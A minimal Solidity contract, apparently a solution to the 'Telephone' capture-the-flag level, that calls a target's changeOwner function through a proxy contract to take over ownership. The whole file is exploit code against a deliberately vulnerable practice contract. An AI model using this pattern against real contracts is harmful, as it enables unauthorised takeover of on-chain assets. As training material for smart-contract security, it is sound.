pragma solidity >=0.4.0 <0.9.0;


interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneProxy {

    function callTelephone(address _addr, address _owner) public {
        Telephone(_addr).changeOwner(_owner);
    }
}